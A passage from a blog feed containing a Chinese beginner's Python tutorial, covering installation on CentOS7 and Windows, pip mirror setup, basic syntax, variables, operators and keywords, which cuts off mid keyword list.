class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line">        self.__score += <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line">stu1 = Stu(name = <span class="string">&quot;cgji1&quot;</span>, sex = <span class="literal">True</span>, age = <span class="number">24</span>, score = <span class="number">59.9</span>)</span><br><span class="line">stu2 = Stu(name = <span class="string">&quot;HMM&quot;</span>, sex = <span class="literal">True</span>, age = <span class="number">24</span>, score = <span class="number">89.9</span>)</span><br><span class="line"></span><br><span class="line">stu2.getSocre()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python基础</title>
      <link href="/2022/10/22/%E7%BC%96%E7%A8%8B/python%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/10/22/%E7%BC%96%E7%A8%8B/python%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="1-python"><a href="#1-python" class="headerlink" title="1.python"></a>1.python</h1><h2 id="1-1-Python-简介"><a href="#1-1-Python-简介" class="headerlink" title="1.1 Python 简介"></a>1.1 Python 简介</h2><table><thead><tr><th>常用安全工具语言</th><th>示例</th></tr></thead><tbody><tr><td>perl</td><td>joomscan whatweb</td></tr><tr><td>ruby</td><td>metasploit-framework</td></tr><tr><td>python</td><td>sqlmap pocsuite3</td></tr><tr><td>go</td><td>goby</td></tr></tbody></table><h2 id="1-2-Python-起源"><a href="#1-2-Python-起源" class="headerlink" title="1.2 Python 起源"></a>1.2 Python 起源</h2><h3 id="1-2-1-语言的作者"><a href="#1-2-1-语言的作者" class="headerlink" title="1.2.1 语言的作者"></a>1.2.1 语言的作者</h3><p>贵铎·范·罗萨姆（Guido van Rossum）荷兰人于1989 年圣诞节始创了python。</p><h3 id="1-2-2编程语言名字的由来"><a href="#1-2-2编程语言名字的由来" class="headerlink" title="1.2.2编程语言名字的由来"></a>1.2.2编程语言名字的由来</h3><p>Monty Python 是英国的喜剧团队。</p><h3 id="1-2-3Pyhton-特点"><a href="#1-2-3Pyhton-特点" class="headerlink" title="1.2.3Pyhton 特点"></a>1.2.3Pyhton 特点</h3><table><thead><tr><th>特点</th><th>说明</th></tr></thead><tbody><tr><td>高级</td><td>有高级的数据结构，缩短开发时间与代码量</td></tr><tr><td>面向对象</td><td>为数据和逻辑相分离的结构化和过程化编程添加了新的活力</td></tr><tr><td>可升级</td><td>提供了基本的开发模块，可以在它上面开发软件，实现代码的重用</td></tr><tr><td>可扩展</td><td>通过将其分离为多个文件或模块加以组织管理</td></tr><tr><td>可移植性</td><td>Python 是用C 写的，又由于C 的可移植性， 使得Python 可以运行在任何带有ANSI C 编译器的平台上</td></tr><tr><td>易学</td><td>Python 关键字少、结构简单、语法清晰</td></tr><tr><td>易读</td><td>没有其他语言通常用来访问变量、定义代码块和进行模式匹配的命令式符号</td></tr><tr><td>内存管理器</td><td>内存管理是由python 解释器负责的</td></tr></tbody></table><h2 id="1-3-环境准备"><a href="#1-3-环境准备" class="headerlink" title="1.3 环境准备"></a>1.3 环境准备</h2><h3 id="1-3-1-Python-版本"><a href="#1-3-1-Python-版本" class="headerlink" title="1.3.1 Python 版本"></a>1.3.1 Python 版本</h3><p><a href="https://link.zhihu.com/?target=https://www.python.org/">Python 官网</a></p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/v2-32fac3f48a55ff53b5061b88c5c9726f_720w.webp" alt="img"></p><p>两个大版本：</p><ul><li>3.x</li><li>2.x</li></ul><h2 id="1-4-CentOS7-下安装Python"><a href="#1-4-CentOS7-下安装Python" class="headerlink" title="1.4 CentOS7 下安装Python"></a>1.4 CentOS7 下安装Python</h2><h3 id="1-4-1-前期准备"><a href="#1-4-1-前期准备" class="headerlink" title="1.4.1 前期准备"></a>1.4.1 前期准备</h3><p>下载安装包</p><p>此处以python3.7.3 为例进行源码包安装演示。可以到<a href="https://link.zhihu.com/?target=https://www.python.org/downloads/release/python-373/">官网下载</a>对应版本的源码包，并且能看到其md5 值。</p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/v2-dd3fd1249814fac2baba3c9dcb245f61_720w.webp" alt="img"></p><p>计算md5 值</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# md5sum Desktop/Python-3.7.3.tgz </span><br><span class="line">2ee10f25e3d1b14215d56c3882486fcf  Desktop/Python-3.7.3.tgz</span><br><span class="line">[root@localhost ~]#</span><br></pre></td></tr></table></figure><p>安装开发环境</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# yum install gcc gcc-c++ zlib-devel bzip2-devel openssl-devel sqlite-devel readline-devel libffi-devel -y</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Complete!</span><br><span class="line">[root@localhost ~]#</span><br></pre></td></tr></table></figure><h3 id="1-4-2-编译安装"><a href="#1-4-2-编译安装" class="headerlink" title="1.4.2 编译安装"></a>1.4.2 编译安装</h3><p>解压缩</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# tar xf Desktop/Python-3.7.3.tgz</span><br></pre></td></tr></table></figure><p>修改配置</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# vim Python-3.7.3/Modules/Setup.dist    </span><br><span class="line">[root@localhost ~]# cat Python-3.7.3/Modules/Setup.dist |grep &quot;^readline&quot;</span><br><span class="line">readline readline.c -lreadline -ltermcap                # 开启代码补全</span><br><span class="line">[root@localhost ~]# cat Python-3.7.3/Modules/Setup.dist |grep &quot;^SSL=&quot; -A3</span><br><span class="line">SSL=/usr/local/ssl                  # 开启SSL 功能，使得Python 可以通过pip 使用https 协议</span><br><span class="line">_ssl _ssl.c \</span><br><span class="line">    -DUSE_SSL -I$(SSL)/include -I$(SSL)/include/openssl \</span><br><span class="line">    -L$(SSL)/lib -lssl -lcrypto</span><br><span class="line">[root@localhost ~]#</span><br></pre></td></tr></table></figure><p>编辑安装</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# ./Python-3.7.3/configure &amp;&amp; make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# which python3</span><br><span class="line">/usr/local/bin/python3</span><br><span class="line">[root@localhost ~]#</span><br></pre></td></tr></table></figure><h3 id="1-4-3-安装测试"><a href="#1-4-3-安装测试" class="headerlink" title="1.4.3 安装测试"></a>1.4.3 安装测试</h3><p>Python3</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# python3</span><br><span class="line">Python 3.7.3 (default, Feb 13 2021, 14:04:11) </span><br><span class="line">[GCC 4.8.5 20150623 (Red Hat 4.8.5-28)] on linux</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; print(&quot;Hello,World&quot;)</span><br><span class="line">Hello,World</span><br><span class="line">&gt;&gt;&gt; exit()</span><br><span class="line">[root@localhost ~]#</span><br></pre></td></tr></table></figure><p>Python2</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# python</span><br><span class="line">Python 2.7.5 (default, Apr 11 2018, 07:36:10) </span><br><span class="line">[GCC 4.8.5 20150623 (Red Hat 4.8.5-28)] on linux2</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; print &quot;Hello,World&quot;</span><br><span class="line">Hello,World</span><br><span class="line">&gt;&gt;&gt; exit()</span><br><span class="line">[root@localhost ~]#</span><br></pre></td></tr></table></figure><h3 id="1-4-4-配置pip3"><a href="#1-4-4-配置pip3" class="headerlink" title="1.4.4 配置pip3"></a>1.4.4 配置pip3</h3><p>配置更新源</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# mkdir ~/.pip</span><br><span class="line">[root@localhost ~]# vim ~/.pip/pip.conf</span><br><span class="line">[root@localhost ~]# cat ~/.pip/pip.conf</span><br><span class="line">[global]</span><br><span class="line">index-url=https://pypi.douban.com/simple</span><br><span class="line">[root@localhost ~]#</span><br></pre></td></tr></table></figure><p>验证下载</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# pip3 install bs4</span><br><span class="line">Looking in indexes: https://pypi.douban.com/simple</span><br><span class="line">Collecting bs4</span><br><span class="line">  Downloading https://pypi.doubanio.com/packages/10/ed/7e8b97591f6f456174139ec089c769f89a94a1a4025fe967691de971f314/bs4-0.0.1.tar.gz</span><br><span class="line">Collecting beautifulsoup4 (from bs4)</span><br><span class="line">  Downloading https://pypi.doubanio.com/packages/d1/41/e6495bd7d3781cee623ce23ea6ac73282a373088fcd0ddc809a047b18eae/beautifulsoup4-4.9.3-py3-none-any.whl (115kB)</span><br><span class="line">    100% |████████████████████████████████| 122kB 8.5MB/s</span><br><span class="line">Collecting soupsieve&gt;1.2; python_version &gt;= &quot;3.0&quot; (from beautifulsoup4-&gt;bs4)</span><br><span class="line">  Downloading https://pypi.doubanio.com/packages/41/e7/3617a4b988ed7744743fb0dbba5aa0a6e3f95a9557b43f8c4740d296b48a/soupsieve-2.2-py3-none-any.whl</span><br><span class="line">Installing collected packages: soupsieve, beautifulsoup4, bs4</span><br><span class="line">  Running setup.py install for bs4 ... done</span><br><span class="line">Successfully installed beautifulsoup4-4.9.3 bs4-0.0.1 soupsieve-2.2</span><br><span class="line">You are using pip version 19.0.3, however version 21.0.1 is available.</span><br><span class="line">You should consider upgrading via the &#x27;pip install --upgrade pip&#x27; command.</span><br><span class="line">[root@localhost ~]#</span><br></pre></td></tr></table></figure><h2 id="1-5-Windows-下安装Python"><a href="#1-5-Windows-下安装Python" class="headerlink" title="1.5 Windows 下安装Python"></a>1.5 Windows 下安装Python</h2><h3 id="1-5-1-软件包安装"><a href="#1-5-1-软件包安装" class="headerlink" title="1.5.1 软件包安装"></a>1.5.1 软件包安装</h3><p>Win7 下安装3.6.0。疯狂下一步即可，记着配置环境变量。Win10 可以安装更高版本，区别不是很大。</p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/v2-5866813e1c76fdb54182e49e21807aac_720w.webp" alt="img"></p><h3 id="1-5-2-环境变量"><a href="#1-5-2-环境变量" class="headerlink" title="1.5.2 环境变量"></a>1.5.2 环境变量</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">C:\Users\AJEST\AppData\Local\Programs\Python\Python36\Scripts\</span><br><span class="line">C:\Users\AJEST\AppData\Local\Programs\Python\Python36\</span><br></pre></td></tr></table></figure><h3 id="1-5-3-配置pip-网络源"><a href="#1-5-3-配置pip-网络源" class="headerlink" title="1.5.3 配置pip 网络源"></a>1.5.3 配置pip 网络源</h3><p>在当前用户家目录下新建文件夹<code>pip</code>，并在该文件夹中新建文件<code>pip.ini</code>，例如。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">c:\Users\AJEST\pip\pip.ini</span><br></pre></td></tr></table></figure><p>写入如下内容</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout = 6000</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">trusted-host = pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure><p>网络源测试</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">C:\Users\AJEST&gt;pip install bs4</span><br><span class="line">Collecting bs4</span><br><span class="line">  Downloading https://pypi.tuna.tsinghua.edu.cn/packages/10/ed/7e8b97591f6f45617</span><br><span class="line">4139ec089c769f89a94a1a4025fe967691de971f314/bs4-0.0.1.tar.gz</span><br><span class="line">Collecting beautifulsoup4 (from bs4)</span><br><span class="line">  Downloading https://pypi.tuna.tsinghua.edu.cn/packages/d1/41/e6495bd7d3781cee6</span><br><span class="line">23ce23ea6ac73282a373088fcd0ddc809a047b18eae/beautifulsoup4-4.9.3-py3-none-any.wh</span><br><span class="line">l (115kB)</span><br><span class="line">    100% |████████████████████████████████| 122kB 6.6MB/s</span><br><span class="line">Collecting soupsieve&gt;1.2; python_version &gt;= &quot;3.0&quot; (from beautifulsoup4-&gt;bs4)</span><br><span class="line">  Downloading https://pypi.tuna.tsinghua.edu.cn/packages/41/e7/3617a4b988ed77447</span><br><span class="line">43fb0dbba5aa0a6e3f95a9557b43f8c4740d296b48a/soupsieve-2.2-py3-none-any.whl</span><br><span class="line">Installing collected packages: soupsieve, beautifulsoup4, bs4</span><br><span class="line">  Running setup.py install for bs4 ... done</span><br><span class="line">Successfully installed beautifulsoup4-4.9.3 bs4-0.0.1 soupsieve-2.2</span><br><span class="line"></span><br><span class="line">C:\Users\AJEST&gt;</span><br></pre></td></tr></table></figure><h2 id="1-6开发工具"><a href="#1-6开发工具" class="headerlink" title="1.6开发工具"></a>1.6开发工具</h2><ul><li><a href="https://link.zhihu.com/?target=https://code.visualstudio.com/docs/setup/windows">vscode</a></li><li>自动安装插件</li></ul><h3 id="1-6-1-Python-的运行方法"><a href="#1-6-1-Python-的运行方法" class="headerlink" title="1.6.1 Python 的运行方法"></a>1.6.1 Python 的运行方法</h3><h4 id="命令行模式"><a href="#命令行模式" class="headerlink" title="命令行模式"></a>命令行模式</h4><p>直接在Python 解释器中运行Python 脚本。</p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/v2-fd4d871e31ea17e2ee077d07ecd0d7b1_720w.webp" alt="img"></p><h4 id="文件模式"><a href="#文件模式" class="headerlink" title="文件模式"></a>文件模式</h4><p>把Python 语句保存在文件（.py）中，然后运行py 文件。</p><p>指定命令解释器和文件编码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br></pre></td></tr></table></figure><p>自带编辑器<code>IDLE</code>。</p><ul><li>字体调整</li><li>F5 运行脚本</li></ul><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/v2-3d6dead50ff06cf29e6891fdb3b71449_720w.webp" alt="img"></p><p>命令行下</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">C:\Users\AJEST\Desktop&gt;python first.py</span><br><span class="line">Hello,World!</span><br></pre></td></tr></table></figure><h1 id="2-Python-初识"><a href="#2-Python-初识" class="headerlink" title="2.Python 初识"></a>2.Python 初识</h1><p><a href="https://link.zhihu.com/?target=https://docs.python.org/3/">Python 语言官方参考</a></p><h2 id="2-1-Python-语法结构"><a href="#2-1-Python-语法结构" class="headerlink" title="2.1 Python 语法结构"></a>2.1 Python 语法结构</h2><h3 id="2-1-1-基本输出"><a href="#2-1-1-基本输出" class="headerlink" title="2.1.1 基本输出"></a>2.1.1 基本输出</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 01 - 基本输入输出.py</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My Name is cgji1&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="2-1-2-注释"><a href="#2-1-2-注释" class="headerlink" title="2.1.2 注释"></a>2.1.2 注释</h3><p>和大部分脚本及Unix-shell 语言一样，Python 也使用【# 符号】标示注释，从<code>#</code> 开始，直到一行结束的内容都是注释，良好的注释习惯可以： <em>方便其他人了解程序功能</em> 方便以后易读懂代码</p><p>除了<code>#</code> 号以外，引号在python 中也同样作为注释使用如三个连续单引号以及连续3 个双引号，通常引号内的字符串作为文档说明使用。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 02 - 注释.py</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    这是注释</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    我是</span></span><br><span class="line"><span class="string">    注释</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I like Python!&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="2-1-3-缩进"><a href="#2-1-3-缩进" class="headerlink" title="2.1.3 缩进"></a>2.1.3 缩进</h3><p>这是Python 语法与其他编程语言最大的区别。</p><p>Python 代码块通过<code>缩进/对齐</code>表达代码逻辑，而不是使用大括号。缩进表达一个语句属于哪个代码块。缩进风格，空格：</p><ul><li>1或2 空格：太短，很难确定代码语句属于哪个块；</li><li>8至10 空格：太长，如果代码内嵌的层次太多，就会使得代码很难阅读；</li><li>4 个空格：刚刚好，范·罗萨姆支持的风格。</li></ul><h3 id="2-1-4-续行"><a href="#2-1-4-续行" class="headerlink" title="2.1.4 续行"></a>2.1.4 续行</h3><p>一行过长的语句可以使用反斜杠<code>\</code> 分解成几行。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 03 - 续行.py</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I like Python very very very very very very very very ve\</span></span><br><span class="line"><span class="string">ry very very very very very very very very very very very very v\</span></span><br><span class="line"><span class="string">ery very very very very very very very very very very very very much&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="2-1-5-同行多句"><a href="#2-1-5-同行多句" class="headerlink" title="2.1.5 同行多句"></a>2.1.5 同行多句</h3><p>Python 推荐每条语句单独占一行，不推荐同行多句。可以使用分号<code>;</code> 将多个语句写在同一行上。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 04 - 同行多句.py</span></span><br><span class="line"><span class="comment"># 不推荐此种写法</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">10</span>;<span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><h2 id="2-2-Python-变量"><a href="#2-2-Python-变量" class="headerlink" title="2.2 Python 变量"></a>2.2 Python 变量</h2><p>根据用户的输入，获取用户名，然后输出欢迎信息。</p><h3 id="2-2-1-变量定义"><a href="#2-2-1-变量定义" class="headerlink" title="2.2.1 变量定义"></a>2.2.1 变量定义</h3><p>变量名称约定：</p><ul><li>变量名由字母、数字、下划线组成，不是全都必须有；</li><li>不能以数字开头；</li><li>区分大小写。</li></ul><table><thead><tr><th>序号</th><th>用户名</th><th>是否合法</th></tr></thead><tbody><tr><td>1</td><td>username</td><td></td></tr><tr><td>2</td><td>userName</td><td></td></tr><tr><td>3</td><td>UserName</td><td></td></tr><tr><td>4</td><td>username_1</td><td></td></tr><tr><td>5</td><td><strong>username</strong></td><td></td></tr><tr><td>6</td><td>userN@me</td><td></td></tr><tr><td>7</td><td>1userName</td><td></td></tr></tbody></table><p>变量的使用过程</p><ul><li>声明变量（变量名字、变量类型）</li><li>初始化（变量第一次赋值）</li><li>变量赋值和反复使用（赋值）</li></ul><p>Python 是（动态类型语言）解释型脚本语言，不需要编译，即不需要预先声明变量的类型，拿过来就能用。</p><h3 id="2-2-2-变量赋值"><a href="#2-2-2-变量赋值" class="headerlink" title="2.2.2 变量赋值"></a>2.2.2 变量赋值</h3><p>变量的类型和值在赋值那一刻被初始化，变量赋值通过赋值运算符<code>=</code> 来执行。</p><p>一个变量如果要使用，就给个值；如果不用，别让它出现。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 05 - 变量赋值.py</span></span><br><span class="line"></span><br><span class="line">username = <span class="string">&quot;cgji1&quot;</span></span><br><span class="line"><span class="comment"># print(&quot;Welcome, &quot; + username)</span></span><br><span class="line"><span class="comment"># print(&quot;Welcome, &#123;&#125;&quot;.format(username))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Welcome, <span class="subst">&#123;username&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>Python 语言中，等号<code>=</code> 是主要的赋值运算符。赋值并不是直接将一个值赋给一个变量。在Python 中，对象是通过引用传递的。在赋值时，不管这个对象是新创建的，还是一个已经存在的，都是将该对象的引用（并不是值）赋值给变量。</p><p>赋值的多种玩法：</p><ul><li>链式多重赋值</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = y = <span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x</span><br><span class="line"><span class="number">1</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><ul><li>增量赋值：从Python 2.0 开始，等号可以和一个算术运算符组合在一起，将计算结果重新赋值给左边的变量,这被称为增量赋值。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = x + <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x</span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = x + <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x ++</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">    x ++</span><br><span class="line">       ^</span><br><span class="line">SyntaxError: invalid syntax</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><ul><li>多元赋值：将多个变量同时赋值的方法称为多元赋值，采用这种方式赋值时，等号两边的对象都是元组。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x,y,z = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y</span><br><span class="line"><span class="number">2</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="2-2-3-捕获屏幕输入"><a href="#2-2-3-捕获屏幕输入" class="headerlink" title="2.2.3 捕获屏幕输入"></a>2.2.3 捕获屏幕输入</h3><p>根据用户的输入打印欢迎信息。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 06 - 打印输出欢迎信息.py</span></span><br><span class="line"></span><br><span class="line">username = <span class="built_in">input</span>(<span class="string">&quot;Please input your name: &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Welcome, <span class="subst">&#123;username&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="2-3-运算符"><a href="#2-3-运算符" class="headerlink" title="2.3 运算符"></a>2.3 运算符</h2><h3 id="2-3-1-算术运算符"><a href="#2-3-1-算术运算符" class="headerlink" title="2.3.1 算术运算符"></a>2.3.1 算术运算符</h3><p>参与运算的操作数是数字，结果也是数字。</p><table><thead><tr><th>算数运算符</th><th>解释</th></tr></thead><tbody><tr><td>+</td><td>* 如果操作数是字符类型，则字符串拼接 * 如果操作数是数字类型，则算术运算。</td></tr><tr><td>-</td><td></td></tr><tr><td>*</td><td>* 如果操作数是数字类型，则算数运算。 * 如果两个操作数其中一个是字符串类型，另一个是数字类型，则将字符串重复输出。</td></tr><tr><td>&#x2F;</td><td></td></tr><tr><td>%</td><td>取余</td></tr><tr><td>&#x2F;&#x2F;</td><td>取商</td></tr><tr><td>**</td><td>幂运算</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span> + <span class="number">3</span></span><br><span class="line"><span class="number">13</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span> - <span class="number">3</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span> * <span class="number">3</span></span><br><span class="line"><span class="number">30</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;cgji1&quot;</span> * <span class="number">5</span></span><br><span class="line"><span class="string">&#x27;AJESTAJESTAJESTAJESTAJEST&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span> / <span class="number">3</span></span><br><span class="line"><span class="number">3.3333333333333335</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span> % <span class="number">3</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span> // <span class="number">3</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span> ** <span class="number">3</span></span><br><span class="line"><span class="number">1000</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="2-3-2-比较运算符"><a href="#2-3-2-比较运算符" class="headerlink" title="2.3.2 比较运算符"></a>2.3.2 比较运算符</h3><p>运算结果是布尔类型的值。运算结果是布尔类型的值，True | False。</p><table><thead><tr><th>比较运算符</th><th>运算结果</th></tr></thead><tbody><tr><td>&lt;</td><td></td></tr><tr><td>&lt;&#x3D;</td><td></td></tr><tr><td>&gt;</td><td></td></tr><tr><td>&gt;&#x3D;</td><td></td></tr><tr><td>&#x3D;&#x3D;</td><td></td></tr><tr><td>!&#x3D;</td><td></td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span> &lt; <span class="number">3</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span> &lt;= <span class="number">3</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span> &gt; <span class="number">3</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span> &gt;= <span class="number">3</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span> == <span class="number">3</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span> != <span class="number">3</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="2-3-3-逻辑运算符"><a href="#2-3-3-逻辑运算符" class="headerlink" title="2.3.3 逻辑运算符"></a>2.3.3 逻辑运算符</h3><p>参与运算的操作数是布尔类型的值，运算结果是布尔类型的值。</p><table><thead><tr><th>逻辑运算符</th><th>解释</th><th>字符表达</th></tr></thead><tbody><tr><td>and</td><td>逻辑与运算</td><td>&amp;</td></tr><tr><td>or</td><td>逻辑或运算</td><td>|</td></tr><tr><td>not</td><td>逻辑非运算</td><td></td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="literal">True</span> <span class="keyword">and</span> <span class="literal">False</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="literal">True</span> <span class="keyword">or</span> <span class="literal">False</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">not</span> <span class="literal">True</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h2 id="2-4-标识符"><a href="#2-4-标识符" class="headerlink" title="2.4 标识符"></a>2.4 标识符</h2><h3 id="2-4-1-关键字"><a href="#2-4-1-关键字" class="headerlink" title="2.4.1 关键字"></a>2.4.1 关键字</h3><p>和其他的高级语言一样，Python 也拥有一些被称作关键字的保留字符。任何语言的关键字应该保持相对的稳定，但是因为Python 是一门不断成长和进化的语言，其关键字偶尔会更新。</p><p>通过keyword 模块查看关键字。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> keyword</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>keyword.iskeyword(<span class="string">&quot;pass&quot;</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>keyword.iskeyword(<span class="string">&quot;cgji1&quot;</span>)</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>keyword.kwlist</span><br><span class="line">[<span class="string">&#x27;False&#x27;</span>, <span class="string">&#x27;None&#x27;</span>, <span class="string">&#x27;True&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;as&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;async&#x27;</span>, <span class="string">&#x27;await&#x27;</span>, <span class="string">&#x27;break&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;continue&#x27;</span>, <span class="string">&#x27;def&#x27;</span>, <span class="string">&#x27;del&#x27;</span>, <span class="string">&#x27;elif&#x27;</span>, <span class="string">&#x27;else&#x27;</span>, <span class="string">&#x27;except&#x27;</span>, <span class="string">&#x27;finally&#x27;</span>, <span class="string">&#x27;for&#x27;</span>, <span class="string">&#x27;from&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;in&#x27;</span>, <span class="string">&#x27;is&#x27;</span>, <span class="string">&#x27;lambda&#x27;</span>, 